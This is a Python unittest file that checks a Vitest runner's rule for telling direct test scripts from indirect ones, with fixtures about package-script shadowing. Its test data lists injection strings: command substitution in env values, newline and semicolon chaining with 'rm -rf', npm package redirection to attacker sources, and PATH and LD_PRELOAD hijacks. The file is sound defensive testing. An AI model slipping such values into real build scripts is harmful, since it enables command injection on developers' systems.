#!/usr/bin/env python3
"""Behavior tests for the direct-Vitest-script predicate used by the runner."""

import contextlib
import io
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import run_vitest


SHADOWING_MARKER = "SHADOWING_PAYLOAD_4C7A"
SHADOWING_BODY = f"echo {SHADOWING_MARKER}"

# Every body demonstrated in the first security review: the environment prefix used
# to smuggle a substitution, a chain, a redirection, a quote or an expansion.
CROSS_ENV_INJECTIONS = [
    "cross-env FOO=$(id) vitest run",
    "cross-env FOO=1;touch /tmp/pwned vitest run",
    "cross-env A=`id` vitest",
    "cross-env A=x&&touch /tmp/pwned vitest",
    "cross-env A=x|touch /tmp/pwned vitest",
    "cross-env A=x>/tmp/pwned vitest",
    "cross-env A=x</tmp/pwned vitest",
    "cross-env A='x;id' vitest",
    'cross-env A="$(id)" vitest',
    "cross-env A=$IFS vitest",
    "cross-env A=x{a,b} vitest",
    "cross-env A=* vitest",
    "cross-env A=~/x vitest",
    "cross-env A=x\\;id vitest",
    "FOO=$(id) vitest run",
    "FOO=`id` vitest run",
    "NODE_OPTIONS=--require=$(id) vitest",
]

# In sh a bare newline separates commands exactly like a semicolon.
NEWLINE_CHAINING = [
    "vitest\ntouch /tmp/pwned",
    "vitest\r\ntouch /tmp/pwned",
    "vitest\n\ntouch /tmp/pwned",
    "vitest run\nrm -rf /tmp/pwned",
    "vitest\rtouch /tmp/pwned",
    "cross-env A=1\nid vitest",
    "npx\nid vitest",
]

# npm keeps parsing --package/-p after the positional, so the tail redirects what npm
# fetches and executes; the safe spelling is `npm exec -- vitest`, which is a different
# shape and is not recognized either.
NPM_EXEC_PACKAGE_REDIRECTION = [
    "npm exec vitest --package=file:./evil",
    "npm exec vitest -p evil-package",
    "npm exec vitest --package=https://example.invalid/evil.tgz",
    "npm exec vitest --package=github:attacker/evil",
    "npm exec vitest",
    "npm exec -- vitest run",
]

# pnpm, bun and yarn run a package.json script of that name when one exists, and only
# fall back to node_modules/.bin when it does not, so a script named "vitest" shadows
# the binary.
SCRIPT_SHADOWING_LAUNCHERS = [
    "pnpm vitest run",
    "pnpm vitest",
    "bun vitest",
    "bun vitest run",
    "yarn vitest run",
    "yarn vitest",
]

# PATH decides which binary runs at all; the shell-startup and dynamic-loader hooks
# make the process execute code of their own before the program's entry point.
EXECUTION_REDIRECTING_ENV_KEYS = [
    "PATH=/tmp/evilbin vitest run",
    "PATH=/tmp/evilbin:/usr/bin vitest run",
    "cross-env PATH=/tmp/evilbin vitest run",
    "NODE_ENV=test PATH=/tmp/evilbin vitest run",
    "BASH_ENV=./evil.sh vitest run",
    "ENV=./evil.sh vitest run",
    "LD_PRELOAD=./evil.so vitest run",
    "LD_LIBRARY_PATH=/tmp/evillib vitest run",
    "DYLD_INSERT_LIBRARIES=./evil.dylib vitest run",
    "DYLD_LIBRARY_PATH=/tmp/evillib vitest run",
]

SHELL_CHAINING = [
    "npm run lint && vitest run",
    "vitest; rm -rf /tmp/pwned",
    "vitest run | cat",
    "vitest run > out.txt",
    "vitest run 2>&1",
    "vitest run `rm -rf /tmp/pwned`",
    "vitest run $(rm -rf /tmp/pwned)",
    "vitest run &",
    "(vitest run)",
    "{ vitest run; }",
]

PLAIN_DIRECT_BODIES = [
    "vitest",
    "vitest run",
    "vitest run --coverage",
    "vitest run --config vitest.config.ts",
    "vitest bench",
]

ENV_PREFIXED_DIRECT_BODIES = [
    "cross-env NODE_ENV=test vitest run",
    "cross-env NODE_ENV=test CI=true vitest run",
    "NODE_ENV=test vitest run",
    "NODE_OPTIONS=--max-old-space-size=4096 vitest run",
    "TZ=UTC vitest run",
    "TZ=America/New_York NODE_ENV=test vitest run",
]

LAUNCHER_DIRECT_BODIES = [
    "npx vitest run",
    "npx --no-install vitest run",
    "pnpm exec vitest run",
    "bunx vitest run",
]

# A longer binary name must never satisfy the vitest or the launcher token.
LONGER_BINARY_PROBES = [
    "vitest-foo run",
    "vitest-foo",
    "vitestx run",
    "vitestx",
    "pnpmx exec vitest run",
    "bunxx vitest run",
    "npxx vitest run",
    "npx vitest-foo run",
]


class DirectScriptPredicateTests(unittest.TestCase):
    def assert_indirect(self, bodies):
        for body in bodies:
            with self.subTest(body=body):
                self.assertFalse(run_vitest.is_direct_vitest_script(body))

    def assert_direct(self, bodies):
        for body in bodies:
            with self.subTest(body=body):
                self.assertTrue(run_vitest.is_direct_vitest_script(body))

    def test_cross_env_substitution_and_chaining_are_indirect(self):
        """Mutation target: an environment value class that admits a shell operator."""
        self.assert_indirect(CROSS_ENV_INJECTIONS)

    def test_newline_chaining_is_indirect(self):
        """Mutation target: \\s separators or re.match instead of a stripped fullmatch."""
        self.assert_indirect(NEWLINE_CHAINING)

    def test_npm_exec_package_redirection_is_indirect(self):
        """Mutation target: readmitting npm exec, whose flags after the positional pick the package."""
        self.assert_indirect(NPM_EXEC_PACKAGE_REDIRECTION)

    def test_script_shadowing_launchers_are_indirect(self):
        """Mutation target: readmitting bare pnpm/bun/yarn, which prefer a same-named script."""
        self.assert_indirect(SCRIPT_SHADOWING_LAUNCHERS)

    def test_execution_redirecting_environment_keys_are_indirect(self):
        """Mutation target: accepting any shell-identifier key, so PATH can replace the binary."""
        self.assert_indirect(EXECUTION_REDIRECTING_ENV_KEYS)

    def test_shell_chaining_and_redirection_are_indirect(self):
        """Mutation target: an argument class that admits a command separator."""
        self.assert_indirect(SHELL_CHAINING)

    def test_empty_and_non_string_bodies_are_indirect(self):
        """Mutation target: treating a missing or non-string script value as direct."""
        self.assert_indirect(["", "   ", None, 123, {"a": 1}, "cross-env", "npx", "cross-env vitest run"])

    def test_plain_vitest_invocations_stay_direct(self):
        """Mutation target: over-tightening the argument class until real scripts stop matching."""
        self.assert_direct(PLAIN_DIRECT_BODIES)

    def test_environment_prefixed_invocations_stay_direct(self):
        """Mutation target: rejecting the KEY=value prefix, which silently drops the project env."""
        self.assert_direct(ENV_PREFIXED_DIRECT_BODIES)

    def test_binary_resolving_launchers_stay_direct(self):
        """Mutation target: dropping a launcher that always resolves to the installed binary."""
        self.assert_direct(LAUNCHER_DIRECT_BODIES)

    def test_surrounding_whitespace_does_not_change_the_verdict(self):
        """Mutation target: a strip() that would let a trailing newline decide the match."""
        self.assert_direct(["  vitest run  ", "vitest run\n", "\n\nvitest run\n\n", "vitest\trun"])

    def test_longer_binary_names_do_not_match(self):
        """Mutation target: an unanchored token that lets a longer binary name pass."""
        self.assert_indirect(LONGER_BINARY_PROBES)


class ShadowingScriptFixtureTests(unittest.TestCase):
    def make_project(self, root):
        """A package.json whose "vitest" script shadows the binary for bare pnpm."""
        (root / "package-lock.json").write_text("{}", encoding="utf-8")
        (root / "package.json").write_text(
            json.dumps(
                {
                    "scripts": {
                        "test": "pnpm vitest run",
                        "vitest": SHADOWING_BODY,
                    }
                }
            ),
            encoding="utf-8",
        )
        local_binary = root / "node_modules" / ".bin" / "vitest"
        local_binary.parent.mkdir(parents=True, exist_ok=True)
        local_binary.write_text("#!/bin/sh\n", encoding="utf-8")

    def run_dry(self, root, extra_args=()):
        argv = ["run_vitest.py", "--root", str(root), "--skip-node-check", "--dry-run", *extra_args]
        stdout = io.StringIO()
        stderr = io.StringIO()
        with patch.object(sys, "argv", argv):
            with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
                run_vitest.main()
        return stdout.getvalue(), stderr.getvalue()

    def test_auto_selection_skips_the_shadowing_script(self):
        """Mutation target: auto-selecting a script whose launcher can resolve to a script."""
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            self.make_project(root)
            package_json = json.loads((root / "package.json").read_text(encoding="utf-8"))
            script_name, skipped_indirect = run_vitest.find_script(package_json, None)

        self.assertIsNone(script_name)
        self.assertTrue(skipped_indirect)

    def test_fallback_reports_the_stable_code_without_leaking_the_script_body(self):
        """Mutation target: printing a script body, or dropping the SCRIPT_NOT_DIRECT note."""
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            self.make_project(root)
            stdout, stderr = self.run_dry(root)

        self.assertIn("SCRIPT_NOT_DIRECT", stdout)
        self.assertIn("node_modules/.bin/vitest", stdout)
        self.assertNotIn("npm run test", stdout)
        for rendered_value in (stdout, stderr):
            self.assertNotIn(SHADOWING_MARKER, rendered_value)
            self.assertNotIn(SHADOWING_BODY, rendered_value)
            self.assertNotIn("pnpm vitest run", rendered_value)

    def test_explicit_script_opt_in_warns_without_leaking_the_script_body(self):
        """Mutation target: silently running an indirect script chosen with --script."""
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            self.make_project(root)
            stdout, stderr = self.run_dry(root, ("--script", "test"))

        self.assertIn("SCRIPT_NOT_DIRECT", stdout)
        self.assertIn("npm run test --", stdout)
        for rendered_value in (stdout, stderr):
            self.assertNotIn(SHADOWING_MARKER, rendered_value)
            self.assertNotIn(SHADOWING_BODY, rendered_value)
            self.assertNotIn("pnpm vitest run", rendered_value)


if __name__ == "__main__":
    unittest.main()
